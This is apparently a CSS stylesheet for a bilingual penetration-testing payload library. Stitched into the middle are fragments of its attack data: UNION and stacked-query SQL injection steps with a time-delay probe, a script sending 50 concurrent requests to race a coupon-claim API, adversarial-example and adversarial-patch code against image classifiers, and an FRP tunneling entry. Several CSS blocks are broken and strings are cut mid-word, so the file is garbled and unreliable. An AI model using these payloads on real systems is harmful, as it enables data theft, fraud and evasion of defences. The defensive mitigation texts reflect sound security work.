        .encoding-tools {
          padding: 24px;
          max-width: 1000px;
          margin: 0 auto;
        }

        .encoding-header {
          margin-bottom: 24px;
        }

        .encoding-header h2 {
          font-size: 24px;
          font-weight: 700;
          margin-bottom: 8px;
          background: var(--gradient-cyber);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
        }

        .encoding-header p {
          font-size: 14px;
          color: var(--text-muted);
        }

        .encoding-tabs {
          display: flex;
          flex-wrap: wrap;
          gap: 8px;
          margin-bottom: 24px;
        }

        .encoding-tab {
          display: flex;
          align-items: center;
          gap: 8px;
          padding: 10px 16px;
          background: var(--bg-card);
          border: 1px solid var(--border-color);
          border-radius: 8px;
          color: var(--text-secondary);
          cursor: pointer;
          transition: all var(--transition-fast);
        }

        .encoding-tab:hover {
          border-color: var(--neon-cyan);
          color: var(--text-primary);
        }

        .encoding-tab.active {
          background: rgba(0, 240, 255, 0.1);
          border-color: var(--neon-cyan);
          color: var(--neon-cyan);
        }

        .tab-icon {
          font-size: 16px;
        }

        .tab-name {
          font-size: 13px;
          font-weight: 500;
        }

        .encoding-content {
          display: grid;
          grid-template-columns: 1fr auto 1fr;
          gap: 16px;
          align-items: start;
        }

        .encoding-panel {
          display: flex;
          flex-direction: column;
          gap: 8px;
        }

        .panel-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
        }

        .panel-header label {
          font-size: 12px;
          font-weight: 600;
          text-transform: uppercase;
          letter-spacing: 1px;
          color: var(--text-muted);
        }

        .clear-btn, .copy-btn {
          background: transparent;
          border: 1px solid var(--border-color);
          color: var(--text-muted);
          padding: 4px 10px;
          border-radius: 4px;
          font-size: 11px;
          cursor: pointer;
          transition: all var(--transition-fast);
        }

        .clear-btn:hover, .copy-btn:hover {
          border-color: var(--neon-cyan);
          color: var(--neon-cyan);
        }

        .copy-btn.copied {
          background: rgba(0, 255, 136, 0.1);
          border-color: var(--neon-green);
          color: var(--neon-green);
        }

        .encoding-panel textarea {
          width: 100%;
          min-height: 200px;
          padding: 16px;
          background: var(--bg-card);
          border: 1px solid var(--border-color);
          border-radius: 8px;
          color: var(--text-primary);
          font-family: var(--font-mono);
          font-size: 13px;
          line-height: 1.6;
          resize: vertical;
          transition: border-color var(--transition-fast);
        }

        .encoding-panel textarea:focus {
          outline: none;
          border-color: var(--neon-cyan);
        }

        .encoding-panel textarea.error {
          border-color: var(--neon-red);
          color: var(--neon-red);
        }

        .encoding-panel textarea::placeholder {
          color: var(--text-muted);
        }

        .encoding-actions {
          display: flex;
          flex-direction: column;
          gap: 8px;
          padding-top: 32px;
        }

        .action-btn {
          padding: 12px 16px;
          background: var(--bg-card);
          border: 1px solid var(--border-color);
          border-radius: 6px;
          color: var(--text-secondary);
          font-size: 12px;
          font-weight: 600;
          cursor: pointer;
          transition: all var(--transition-fast);
          white-space: nowrap;
        }

        .action-btn:hover:not(:disabled) {
          border-color: var(--neon-cyan);
          color: var(--neon-cyan);
        }

        .action-btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        .action-btn.encode:hover:not(:disabled) {
          background: rgba(0, 240, 255, 0.1);
        }

        .action-btn.decode:hover:not(:disabled) {
          background: rgba(255, 0, 255, 0.1);
          border-color: var(--neon-pink);
          color: var(--neon-pink);
        }

        .action-btn.swap {
          background: rgba(255, 102, 0, 0.1);
          border-color: var(--neon-orange);
          color: var(--neon-orange);
        }

        .encoding-info {
          margin-top: 24px;
          padding: 16px;
          background: var(--bg-card);
          border: 1px solid var(--border-color);
          border-radius: 8px;
        }

        .encoding-info h4 {
          font-size: 13px;
          font-weight: 600;
          margin-bottom: 8px;
          color: var(--neon-yellow);
        }

        .encoding-info p {
          font-size: 13px;
          color: var(--text-secondary);
          line-height: 1.6;
        }

        @media (max-width: 768px) {
          .encoding-content {
            grid-template-columns: 1fr;
          }

          .encoding-actions {
            flex-direction: row;
            justify-content: center;
            padding-top: 0;
          }
        }

          .header {
            height: 60px;
            background: linear-gradient(180deg, var(--bg-secondary) 0%, var(--bg-primary) 100%);
            border-bottom: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 20px;
            position: relative;
            z-index: 100;
          }

          .header::before {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--neon-cyan), transparent);
          }

          .header-left {
            display: flex;
            align-items: center;
            gap: 16px;
          }

          .menu-toggle {
            background: transparent;
            border: 1px solid var(--border-color);
            color: var(--text-secondary);
            width: 36px;
            height: 36px;
            border-radius: 4px;
            font-size: 18px;
            cursor: pointer;
            transition: all var(--transition-fast);
          }

          .menu-toggle:hover {
            border-color: var(--neon-cyan);
            color: var(--neon-cyan);
          }

          .logo {
            display: flex;
            align-items: center;
            gap: 10px;
          }

          .logo-icon {
            font-size: 28px;
            filter: drop-shadow(0 0 10px var(--neon-cyan));
          }

          .logo-text {
            font-family: var(--font-display);
            font-size: 20px;
            font-weight: 700;
            letter-spacing: 3px;
            background: var(--gradient-cyber);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
          }

          .nav-links {
            display: flex;
            align-items: center;
            margin-left: 20px;
            padding-left: 20px;
            border-left: 1px solid var(--border-color);
            gap: 16px;
          }

          .nav-link {
            font-size: 13px;
            color: var(--text-muted);
            font-weight: 500;
            transition: all var(--transition-fast);
            position: relative;
          }

          .nav-link:hover {
            color: var(--neon-cyan);
          }

          .nav-link::after {
            content: '';
            position: absolute;
            bottom: -4px;
            left: 0;
            width: 0;
            height: 1px;
            background: var(--neon-cyan);
            transition: width var(--transition-fast);
          }

          .nav-link:hover::after {
            width: 100%;
          }

          .github-link {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-left: 10px;
            color: var(--text-muted);
            transition: color var(--transition-fast);
          }

          .github-link:hover {
            color: var(--neon-cyan);
          }

          .header-center {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 12px;
          }

          /* ===== Search Box ===== */
          .search-box {
            display: flex;
            align-items: center;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 0 10px;
            width: 260px;
            transition: all var(--transition-fast);
          }

          .search-box:focus-within {
            border-color: var(--neon-cyan);
            box-shadow: 0 0 12px rgba(0, 240, 255, 0.15);
            width: 320px;
          }

          .search-icon {
            font-size: 14px;
            margin-right: 6px;
            opacity: 0.6;
          }

          .search-input {
            background: transparent;
            border: none;
            color: var(--text-primary);
            font-size: 13px;
            padding: 8px 0;
            flex: 1;
            outline: none;
            width: 100%;
          }

          .search-input::placeholder {
            color: var(--text-muted);
            font-size: 12px;
          }

          .search-input:focus {
            box-shadow: none;
            border: none;
          }

          .search-clear {
            background: transparent;
            border: none;
            color: var(--text-muted);
            font-size: 18px;
            cursor: pointer;
            padding: 0 4px;
            transition: color var(--transition-fast);
          }

          .search-clear:hover {
            color: var(--neon-red);
          }

          .tab-switcher {
            display: flex;
            background: var(--bg-tertiary);
            border-radius: 6px;
            padding: 4px;
            border: 1px solid var(--border-color);
          }

          .tab-btn {
            background: transparent;
            border: none;
            color: var(--text-secondary);
            padding: 8px 20px;
            border-radius: 4px;
            font-family: var(--font-body);
            font-size: 13px;
            cursor: pointer;
            transition: all var(--transition-fast);
          }

          .tab-btn:hover {
            color: var(--text-primary);
          }

          .tab-btn.active {
            background: var(--neon-cyan);
            color: var(--bg-primary);
            font-weight: 600;
          }

          .header-right {
            display: flex;
            align-items: center;
            gap: 12px;
          }

          /* ===== Theme Toggle ===== */
          .lang-toggle {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            color: var(--text-secondary);
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all var(--transition-fast);
          }

          .lang-toggle:hover {
            border-color: var(--neon-green);
            color: var(--neon-green);
            box-shadow: 0 0 12px rgba(0, 255, 136, 0.2);
          }

          .theme-toggle {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            width: 36px;
            height: 36px;
            border-radius: 6px;
            font-size: 18px;
            cursor: pointer;
            transition: all var(--transition-fast);
            display: flex;
            align-items: center;
            justify-content: center;
          }

          .theme-toggle:hover {
            border-color: var(--neon-yellow);
            box-shadow: 0 0 12px rgba(255, 255, 0, 0.2);
            transform: scale(1.1);
          }

          .encoding-toggle {
            background: rgba(139, 0, 255, 0.1);
            border: 1px solid var(--neon-purple);
            color: var(--neon-purple);
            padding: 8px 14px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 500;
            cursor: pointer;
            transition: all var(--transition-fast);
          }

          .encoding-toggle:hover {
            background: rgba(139, 0, 255, 0.2);
            box-shadow: 0 0 15px rgba(139, 0, 255, 0.3);
          }

          .mode-switcher {
            display: flex;
            align-items: center;
            gap: 8px;
            background: var(--bg-tertiary);
            padding: 4px 12px;
            border-radius: 6px;
            border: 1px solid var(--border-color);
          }

          .mode-label {
            font-size: 12px;
            color: var(--text-muted);
          }

          .mode-btn {
            background: transparent;
            border: 1px solid transparent;
            color: var(--text-secondary);
            padding: 4px 10px;
            border-radius: 4px;
            font-size: 12px;
            cursor: pointer;
            transition: all var(--transition-fast);
          }

          .mode-btn:hover {
            color: var(--text-primary);
          }

          .mode-btn.active {
            background: rgba(0, 240, 255, 0.1);
            border-color: var(--neon-cyan);
            color: var(--neon-cyan);
          }

          .mode-btn.active.warning {
            background: rgba(255, 102, 0, 0.1);
            border-color: var(--neon-orange);
            color: var(--neon-orange);
          }

          .mode-btn.active.danger {
            background: rgba(255, 0, 85, 0.1);
            border-color: var(--neon-red);
            color: var(--neon-red);
          }

          .variables-dropdown {
            position: relative;
          }
          
          /* Only for desktop, mobile uses sidebar */
          .variables-panel {
            position: absolute;
            top: calc(100% + 8px);
            right: 0;
            width: 400px;
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            box-shadow: var(--shadow-card);
            z-index: 1000;
          }

          .variables-toggle {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            color: var(--text-secondary);
            padding: 8px 16px;
            border-radius: 6px;
            font-size: 13px;
            cursor: pointer;
            transition: all var(--transition-fast);
          }

          .variables-toggle:hover {
            border-color: var(--neon-cyan);
            color: var(--neon-cyan);
          }

          .variables-header {
            padding: 16px;
            border-bottom: 1px solid var(--border-color);
          }

          .variables-header h3 {
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 4px;
          }

          .variables-hint {
            font-size: 11px;
            color: var(--text-muted);
          }

          .variables-list {
            max-height: 300px;
            overflow-y: auto;
          }

          .variable-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 16px;
            border-bottom: 1px solid var(--border-color);
          }

          .variable-item:last-child {
            border-bottom: none;
          }

          .variable-info {
            display: flex;
            flex-direction: column;
            gap: 2px;
          }

          .variable-key {
            font-family: var(--font-mono);
            font-size: 12px;
            color: var(--neon-cyan);
          }

          .variable-desc {
            font-size: 11px;
            color: var(--text-muted);
          }

          .variable-input {
            width: 150px;
            padding: 6px 10px;
            font-size: 12px;
          }

          .mobile-menu-btn {
            display: none;
          }

          /* Mobile styles */
          @media (max-width: 768px) {
            .header {
              padding: 0 10px;
              gap: 10px;
            }

            .logo-subtitle {
              display: none;
            }

          .nav-links {
            display: none;
          }

          .mobile-menu-btn {
            display: block;
            background: transparent;
            border: 1px solid var(--border-color);
            color: var(--text-secondary);
            width: 36px;
            height: 36px;
            border-radius: 4px;
            font-size: 18px;
            cursor: pointer;
            z-index: 2001;
          }

          .mobile-menu-overlay {
            position: fixed;
            top: 60px;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            z-index: 2000;
            display: flex;
            justify-content: flex-end;
          }

          .mobile-menu {
            width: 200px;
            background: var(--bg-card);
            border-left: 1px solid var(--border-color);
            padding: 16px;
            display: flex;
            flex-direction: column;
            gap: 16px;
            animation: slideLeft 0.3s ease;
          }

          @keyframes slideLeft {
            from { transform: translateX(100%); }
            to { transform: translateX(0); }
          }

          .mobile-nav-link {
            font-size: 14px;
            color: var(--text-secondary);
            padding: 8px;
            border-bottom: 1px solid var(--border-color);
            text-decoration: none;
          }

          .mobile-nav-link:hover {
            color: var(--neon-cyan);
            border-color: var(--neon-cyan);
          }

          .github-link {
            display: none;
          }

            .header-center {
              flex: 1;
              justify-content: flex-end; /* Push to right if needed */
              gap: 8px;
            }

            .search-box {
              display: none;
            }
            
            .tab-switcher {
              display: none; /* Hide tabs on mobile header, maybe move to sidebar? */
            }

            .header-right {
              gap: 8px;
            }

            .header-right > button:not(.mobile-menu-btn), .header-right > div {
              display: none;
            }
            
            /* Keep only search box on mobile if user wants */
            /* But currently user wants them accessible, so we move to sidebar and hide here */

            .lang-toggle {
              padding: 6px;
            }
            
            .variables-toggle {
              padding: 6px 10px;
            }
            
            .variables-panel {
              width: 300px;
              right: -50px;
            }

            .mode-label {
              display: none;
            }
            
            .mode-switcher {
              display: none; /* Hide mode switcher on mobile header */
            }
          }

          .encoding-modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            animation: fadeIn 0.2s ease;
          }

          @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }

            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            width: 95%;
            max-width: 1100px;
            max-height: 90vh;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            animation: slideUp 0.3s ease;
          }

          .variables-modal {
             max-width: 600px;
          }
          
          .variables-list-modal {
             padding: 0;
          }

          @keyframes slideUp {
            from {
              opacity: 0;
              transform: translateY(20px);

            to {

              transform: translateY(0);

          }

          .encoding-modal-header h2 {
            font-size: 18px;
            font-weight: 600;

          .close-btn {

            color: var(--text-muted);

            cursor: pointer;
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 4px;
            transition: all var(--transition-fast);
          }

          .close-btn:hover {
            background: var(--bg-hover);
            color: var(--text-primary);
          }

          .encoding-modal-body {
            max-height: calc(90vh - 70px);
            overflow-y: auto;
          }

          .encoding-modal-body .encoding-tools {
            padding: 16px 24px;
          }

          .encoding-modal-body .encoding-header {

nt must be determined (via ORDER BY incrementing or UNION SELECT NULL), then NULLs are progressively replaced with target fields to extract database names, table names, column names, and data.`},exploitation:{zh:`UNION注入步骤：1)ORDER BY N确定列数 2)UNION SELECT NULL,...找到回显位 3)替换回显位为version()/database() 4)查询information_schema获取表名和列名 5)UNION SELECT提取目标数据(用户名、密码哈希等)。`,en:`UNIONInjectionStep: 1)ORDER BY NDeterminecolumnNumber 2)UNION SELECT NULL,...Find to Echo/Outputbit 3)ReplaceEcho/Outputbit is version()/database() 4)Queryinformation_schemaObtaintablename and columnname 5)UNION SELECTExtractTargetData(Username, Passwordhash etc.).`},mitigation:{zh:`防御UNION注入：使用参数化查询(最有效)，部署WAF检测UNION SELECT关键词组合，限制查询返回的列数和行数，对information_schema的访问权限进行限制，最小化数据库用户权限。`,en:`Defend against UNION injection: use parameterized queries (most effective), deploy WAF to detect UNION SELECT keyword combinations, limit the number of columns and rows returned by queries, restrict access to information_schema, and minimize database user privileges.`},difficulty:`beginner`}},{id:`sqli-stacked`,name:{zh:`堆叠查询注入`,en:`Stacked Queries Injection`},description:{zh:`执行多条SQL语句的注入`,en:`Injection for executing multiple SQL statements`},category:{zh:`SQL/NoSQL注入`,en:`SQL/NoSQL Injection`},subCategory:{zh:`堆叠查询`,en:`Stacked Queries`},tags:[`sqli`,`stacked`,`queries`],prerequisites:[{zh:`支持多语句执行`,en:`Supports multi-statement execution`},`MySQL/PostgreSQL/MSSQL`],execution:[{title:{zh:`1. 探测堆叠查询`,en:`1. DetectStacked Queries`},command:`'; SELECT SLEEP(5)--

import aiohttp

async def race_request(session, url, headers, data):
    async with session.post(url, headers=headers, json=data) as resp:
        return await resp.json()

async def main():
    url = "https://{TARGET}/api/coupon/claim"
    headers = {"Authorization": "Bearer {TOKEN}"}
    data = {"coupon_id": "COUPON001"}
    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, headers, data) for _ in range(50)]
        results = await asyncio.gather(*tasks)

from torchvision import transforms

model = models.resnet50(pretrained=True).eval()

def fgsm_attack(image, epsilon, data_grad):
    sign_grad = data_grad.sign()
    perturbed = image + epsilon * sign_grad
    return torch.clamp(perturbed, 0, 1)

# 加载并预处理图像

transform = transforms.Compose([transforms.Resize(256), 
    transforms.CenterCrop(224), transforms.ToTensor()])

img_tensor.requires_grad = True

# 前向传播

loss.backward()

def boundary_attack(original_img, target_class, max_queries=5000):
    """Decision-based boundary attack"""

        candidate = (1-alpha) * original_img + alpha * adv

import torch

def generate_adversarial_patch(model, target_class, patch_size=50, epochs=500):
    """生成可打印的对抗补丁"""
    patch = torch.rand(1, 3, patch_size, patch_size, requires_grad=True)
    optimizer = torch.optim.Adam([patch], lr=0.01)
    
    for epoch in range(epochs):
        # 将patch应用到随机位置
        x, y = random.randint(0,174), random.randint(0,174)
        img = torch.rand(1, 3, 224, 224)  # 随机背景
        img[:, :, x:x+patch_size, y:y+patch_size] = patch
        
        output = model(img)
        loss = -torch.nn.functional.cross_entropy(
            output, torch.tensor([target_class]))
        
        optimizer.zero_grad()
        loss.backward()
        optimizer.step()
        patch.data.clamp_(0, 1)
    
    return patch.detach()

ly.`},mitigation:{zh:`防御措施：1) 监控注册表关键键值变化；2) 使用白名单限制程序执行；3) 定期审计持久化项；4) 部署EDR检测异常行为。`,en:`Defenses: 1) Monitor changes to critical registry keys; 2) Use application whitelisting to restrict execution; 3) Regularly audit persistence entries; 4) Deploy EDR to detect anomalous behavior.`},difficulty:`intermediate`}},{id:`tunnel-frp`,name:{zh:`FRP内网穿透`,en:`FRP Intranet Tunneling`},description:{zh:`使用FRP建立内网穿透隧道`,en:`UseFRPEstablishInternal network tunnelingtunnel`},category:{zh:`隧道代理`,en:`Tunneling & Proxy`},subCategory:{zh:`TCP隧道`,en:`TCP Tunnel`},tags:[`frp`,`tunnel`,`proxy`,`nat`],prerequisites:[{zh:`公网服务器`,en:`Public networkServer`},{zh:`内网机器可访问公网`,en:`Internal networkMachineCanAccessPublic network`},{zh:`FRP工具`,en:`FRPTools`}],execution:[{title:{zh:`服务端配置`,en:`Server-SideConfiguration`},command:`[common]

            padding-bottom: 2px;

            border-radius: 4px;
            font-size: 11px;
            cursor: pointer;
            white-space: nowrap;

            border-color: var(--neon-cyan);

            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;

          }

            border-color: var(--neon-cyan);

          color: var(--text-muted);
          margin-bottom: 4px;
        }

        .no-results-hint {
          font-size: 11px;
          color: var(--text-muted);

          padding: 8px 12px;
          cursor: pointer;
          transition: all var(--transition-fast);
          border-left: 2px solid transparent;
        }

        .tree-item:hover {
          background: var(--bg-hover);
        }

        .tree-item.selected {
          background: rgba(0, 240, 255, 0.1);
          border-left-color: var(--neon-cyan);
        }

        .tree-item.selected .tree-label {
          color: var(--neon-cyan);

        .tree-item.search-match {
          background: rgba(0, 255, 136, 0.08);

        }

        .tree-item.search-match .tree-label {
          color: var(--neon-green);
          font-weight: 600;
        }

        .tree-expand-icon {
          width: 16px;
          font-size: 8px;
          color: var(--text-muted);
          transition: transform var(--transition-fast);
          margin-right: 4px;
        }

        .tree-expand-icon.expanded {
          transform: rotate(90deg);
        }

        .tree-leaf-spacer {
          width: 20px;
        }

        .tree-label {
          flex: 1;
          font-size: 13px;
          color: var(--text-secondary);
          white-space: nowrap;
          overflow: hidden;
          text-overflow: ellipsis;
        }

        .tree-item:hover .tree-label {
          color: var(--text-primary);
        }

        .tree-badge {
          font-size: 12px;
          opacity: 0.7;
        }

        .tree-children {
          animation: slideDown 0.2s ease;
        }

        @keyframes slideDown {
          from {
            opacity: 0;
            transform: translateY(-10px);
          }

        }

        .payload-detail {
          padding: 24px;
          max-width: 1200px;
          margin: 0 auto;
        }

        .payload-header {
          display: flex;
          justify-content: space-between;
          gap: 24px;
          padding-bottom: 24px;
          border-bottom: 1px solid var(--border-color);
          margin-bottom: 24px;
        }

        .payload-title-section {
          flex: 1;
        }

        .payload-tags {
          display: flex;
          flex-wrap: wrap;
          gap: 8px;
          margin-bottom: 12px;
        }

        .payload-title {
          font-size: 28px;
          font-weight: 700;
          margin-bottom: 8px;
          background: var(--gradient-cyber);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
        }

        .payload-description {
          font-size: 14px;
          color: var(--text-secondary);
          line-height: 1.6;
        }

        .payload-meta {
          display: flex;
          flex-direction: column;
          gap: 12px;
          min-width: 200px;
        }

        .meta-item {
          display: flex;
          flex-direction: column;
          gap: 4px;
        }

        .meta-label {
          font-size: 11px;
          text-transform: uppercase;
          letter-spacing: 1px;
          color: var(--text-muted);
        }

        .meta-value {
          font-size: 14px;
          font-weight: 600;
        }

        .meta-value.difficulty {
          font-family: var(--font-display);
        }

        .prerequisites-section {
          background: var(--bg-card);
          border: 1px solid var(--border-color);
          border-radius: 8px;
          padding: 16px;
          margin-bottom: 24px;
        }

        .prerequisites-section h3 {
          font-size: 14px;
          font-weight: 600;
          margin-bottom: 12px;
        }

        .prerequisites-list {
          list-style: none;
        }

        .prerequisites-list li {
          position: relative;
          padding-left: 20px;
          font-size: 13px;
          color: var(--text-secondary);
          margin-bottom: 8px;
        }

        .prerequisites-list li::before {
          content: '✓';
          position: absolute;
          left: 0;
          color: var(--neon-green);
        }

        .section-tabs {
          display: flex;
          gap: 8px;
          margin-bottom: 24px;
          padding-bottom: 16px;
          border-bottom: 1px solid var(--border-color);
        }

        .section-tab {
          background: var(--bg-tertiary);
          border: 1px solid var(--border-color);
          color: var(--text-secondary);
          padding: 10px 20px;
          border-radius: 6px;
          font-size: 13px;
          cursor: pointer;
          transition: all var(--transition-fast);
        }

        .section-tab:hover {
          border-color: var(--neon-cyan);
          color: var(--text-primary);
        }

        .section-tab.active {
          background: rgba(0, 240, 255, 0.1);
          border-color: var(--neon-cyan);
          color: var(--neon-cyan);
        }

        /* ===== Execution Toolbar ===== */
        .execution-toolbar {
          display: flex;
          align-items: center;
          justify-content: space-between;
          margin-bottom: 16px;
        }

        .copy-all-btn {
          background: var(--bg-tertiary);
          border: 1px solid var(--neon-cyan);
          color: var(--neon-cyan);
          padding: 8px 16px;
          border-radius: 6px;
          font-size: 13px;
          font-weight: 500;
          cursor: pointer;
          transition: all var(--transition-fast);
        }

        .copy-all-btn:hover {
          background: rgba(0, 240, 255, 0.15);
          box-shadow: 0 0 12px rgba(0, 240, 255, 0.2);
        }

        .copy-all-btn.copied {
          background: rgba(0, 255, 136, 0.1);
          border-color: var(--neon-green);
          color: var(--neon-green);
        }

        .step-count {
          font-size: 12px;
          color: var(--text-muted);
        }

        .bypass-notice {
          display: flex;
          align-items: center;
          gap: 12px;
          padding: 12px 16px;
          border-radius: 6px;
          margin-bottom: 16px;
          font-size: 13px;
        }

        .bypass-notice.waf {
          background: rgba(255, 102, 0, 0.1);
          border: 1px solid rgba(255, 102, 0, 0.3);
          color: var(--neon-orange);
        }

        .bypass-notice.edr {
          background: rgba(255, 0, 85, 0.1);
          border: 1px solid rgba(255, 0, 85, 0.3);
          color: var(--neon-red);
        }

        .execution-list {
          display: flex;
          flex-direction: column;
          gap: 16px;
        }

        .execution-item {
          display: flex;
          gap: 16px;
          align-items: flex-start;
        }

        .execution-step-badge {
          display: flex;
          align-items: center;
          justify-content: center;
          width: 32px;
          height: 32px;
          min-width: 32px;
          border-radius: 50%;
          background: rgba(0, 240, 255, 0.15);
          border: 1px solid var(--neon-cyan);
          margin-top: 16px;
        }

        .step-number {
          font-family: var(--font-display);
          font-size: 12px;
          font-weight: 700;
          color: var(--neon-cyan);
        }

        .execution-content {
          flex: 1;
          background: var(--bg-card);
          border: 1px solid var(--border-color);
          border-radius: 8px;
          padding: 16px;
          transition: all var(--transition-fast);
        }

        .execution-content:hover {
          border-color: var(--neon-cyan);
        }

        .execution-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 8px;
        }

        .execution-title {
          font-size: 14px;
          font-weight: 600;
        }

        .execution-badges {
          display: flex;
          gap: 8px;
        }

        .badge {
          font-size: 11px;
          padding: 2px 8px;
          border-radius: 4px;
          background: var(--bg-tertiary);
          color: var(--text-secondary);
        }

        .badge.platform-windows {
          background: rgba(0, 102, 255, 0.2);
          color: var(--neon-blue);
        }

        .badge.platform-linux {
          background: rgba(255, 136, 0, 0.2);
          color: var(--neon-orange);
        }

        .badge.admin {
          background: rgba(255, 0, 85, 0.2);
          color: var(--neon-red);
        }

        .execution-desc {
          font-size: 13px;
          color: var(--text-muted);
          margin-bottom: 12px;
        }

        .code-block-wrapper {
          display: flex;
          flex-direction: column;
          gap: 8px;
        }

        .code-block {
          background: var(--bg-tertiary);
          border: 1px solid var(--border-color);
          border-radius: 6px;
          padding: 12px 16px;
          font-family: var(--font-mono);
          font-size: 13px;
          overflow-x: auto;
          position: relative;
        }

        .code-block::before {
          content: '';
          position: absolute;
          left: 0;
          top: 0;
          bottom: 0;
          width: 3px;
          background: var(--neon-cyan);
          border-radius: 6px 0 0 6px;
        }

        /* Variable highlight in commands */
        .var-highlight {
          background: rgba(0, 255, 136, 0.15);
          color: var(--neon-green);
          padding: 1px 4px;
          border-radius: 3px;
          border-bottom: 1px dashed var(--neon-green);
          cursor: help;
        }

        .code-actions {
          display: flex;
          justify-content: flex-end;
          gap: 8px;
        }

        .syntax-btn, .copy-btn {
          background: var(--bg-tertiary);
          border: 1px solid var(--border-color);
          color: var(--text-secondary);
          padding: 6px 12px;
          border-radius: 4px;
          font-size: 12px;
          cursor: pointer;
          transition: all var(--transition-fast);
        }

        .syntax-btn:hover, .copy-btn:hover {
          border-color: var(--neon-cyan);
          color: var(--neon-cyan);
        }

        .copy-btn.copied {
          background: rgba(0, 255, 136, 0.1);
          border-color: var(--neon-green);
          color: var(--neon-green);
        }

        /* ===== Attack Chain Visualization ===== */
        .chain-section {
          padding: 8px 0;
        }

        .chain-header-info {
          margin-bottom: 24px;
        }

        .chain-header-info h3 {
          font-size: 16px;
          font-weight: 600;
          color: var(--neon-cyan);
          margin-bottom: 6px;
        }

        .chain-header-info p {
          font-size: 13px;
          color: var(--text-muted);
        }

        .chain-visualization {
          display: flex;
          flex-direction: column;
          gap: 0;
          position: relative;
        }

        .chain-node-wrapper {
          display: flex;
          flex-direction: column;
          align-items: center;
        }

        .chain-node {
          width: 100%;
          max-width: 600px;
          background: var(--bg-card);
          border: 1px solid var(--border-color);
          border-radius: 12px;
          padding: 20px;
          position: relative;
          transition: all var(--transition-fast);
        }

        .chain-node:hover {
          border-color: var(--neon-cyan);
          box-shadow: var(--shadow-neon);
          transform: translateY(-2px);
        }

        .chain-node.first {
          border-color: var(--neon-green);
        }

        .chain-node.first .chain-step {
          background: rgba(0, 255, 136, 0.15);
          color: var(--neon-green);
          border-color: var(--neon-green);
        }

        .chain-node.last {
          border-color: var(--neon-red);
        }

        .chain-node.last .chain-step {
          background: rgba(255, 0, 85, 0.15);
          color: var(--neon-red);
          border-color: var(--neon-red);
        }

        .chain-node-header {
          display: flex;
          align-items: center;
          justify-content: space-between;
          margin-bottom: 8px;
        }

        .chain-step {
          font-family: var(--font-display);
          font-size: 10px;
          font-weight: 700;
          letter-spacing: 2px;
          padding: 3px 10px;
          border-radius: 4px;
          background: rgba(0, 240, 255, 0.1);
          color: var(--neon-cyan);
          border: 1px solid rgba(0, 240, 255, 0.3);
        }

        .chain-platform {
          font-size: 14px;
        }

        .chain-node-title {
          font-size: 15px;
          font-weight: 600;
          margin-bottom: 6px;
          color: var(--text-primary);
        }

        .chain-node-desc {
          font-size: 12px;
          color: var(--text-muted);
          margin-bottom: 10px;
          line-height: 1.5;
        }

        .chain-command-preview {
          background: var(--bg-tertiary);
          border: 1px solid var(--border-color);
          border-radius: 6px;
          padding: 8px 12px;
          margin-bottom: 10px;
        }

        .chain-command-preview code {
          font-family: var(--font-mono);
          font-size: 11px;
          color: var(--neon-cyan);
          word-break: break-all;
        }

        .chain-node-actions {
          display: flex;
          gap: 6px;
          justify-content: flex-end;
        }

        .chain-copy-btn, .chain-syntax-btn {
          background: var(--bg-tertiary);
          border: 1px solid var(--border-color);
          color: var(--text-secondary);
          width: 30px;
          height: 30px;
          border-radius: 4px;
          font-size: 14px;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          transition: all var(--transition-fast);
        }

        .chain-copy-btn:hover, .chain-syntax-btn:hover {
          border-color: var(--neon-cyan);
          color: var(--neon-cyan);
        }

        .chain-copy-btn.copied {
          background: rgba(0, 255, 136, 0.1);
          border-color: var(--neon-green);
          color: var(--neon-green);
        }

        .chain-connector {
          display: flex;
          flex-direction: column;
          align-items: center;
          padding: 4px 0;
        }

        .chain-arrow {
          width: 2px;
          height: 20px;
          background: linear-gradient(180deg, var(--neon-cyan), var(--neon-purple));
        }
